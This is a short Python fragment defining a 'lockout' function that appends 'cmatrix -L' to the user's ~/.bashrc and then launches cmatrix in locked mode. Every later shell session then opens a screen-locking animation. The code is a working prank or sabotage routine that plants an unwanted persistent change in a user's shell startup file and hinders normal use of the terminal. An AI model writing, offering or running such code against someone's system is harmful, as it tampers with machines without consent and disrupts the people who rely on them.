import os
import sys
def lockout():
    os.system("echo 'cmatrix -L' >> ~/.bashrc")
    os.system("cmatrix -L")